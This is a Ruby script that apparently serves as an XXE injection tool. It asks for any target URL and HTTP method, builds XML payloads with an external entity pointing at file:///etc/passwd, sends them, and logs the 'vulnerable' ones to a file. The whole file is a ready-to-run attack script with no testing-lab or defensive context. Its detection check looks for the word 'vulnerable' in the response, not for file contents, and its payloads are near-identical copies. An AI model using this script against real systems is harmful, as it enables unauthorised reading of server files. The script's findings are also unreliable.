require 'net/http'
require 'uri'
require 'colorize'

def inject_xml(xml_payload, target_url, http_method)
  uri = URI.parse(target_url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')

  request = case http_method.downcase
            when 'get'
              Net::HTTP::Get.new(uri.request_uri)
            when 'post'
              Net::HTTP::Post.new(uri.request_uri)
            when 'put'
              Net::HTTP::Put.new(uri.request_uri)
            when 'delete'
              Net::HTTP::Delete.new(uri.request_uri)
            else
              raise "Invalid HTTP method: #{http_method}".red
            end

  request.body = xml_payload if request.request_body_permitted?
  request['Content-Type'] = 'application/xml'

  begin
    response = http.request(request)
    return response
  rescue StandardError => e
    puts "Error: #{e.message}".red
    return nil
  end
end

def test_payloads(payloads, target_url, http_method)
  vulnerabilities = []

  payloads.each do |payload|
    puts "Testing payload: #{payload}".yellow
    response = inject_xml(payload, target_url, http_method)
    vulnerabilities << payload if response && response.code == '200' && response.body.include?('vulnerable')
  end

  vulnerabilities
end

def save_to_file(filename, content)
  File.open(filename, 'w') { |file| file.write(content) }
end

puts "Enter your target website URL: ".cyan
target_url = gets.chomp

puts "Enter HTTP method (GET, POST, PUT, DELETE): ".cyan
http_method = gets.chomp

puts "Enter the number of payloads to generate: ".cyan
num_payloads = gets.chomp.to_i

payloads = []

num_payloads.times do |i|
  payloads << %Q{<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe#{i} SYSTEM "file:///etc/passwd" >]>
<foo>&xxe#{i};</foo>}
end

vulnerabilities = test_payloads(payloads, target_url, http_method)

if vulnerabilities.empty?
  puts "No vulnerabilities found.".green
else
  puts "Vulnerabilities found with the following payloads:".red
  vulnerabilities.each { |payload| puts payload }
  save_to_file('vulnerabilities.txt', vulnerabilities.join("\n"))
  puts "Vulnerabilities saved to vulnerabilities.txt".green
end
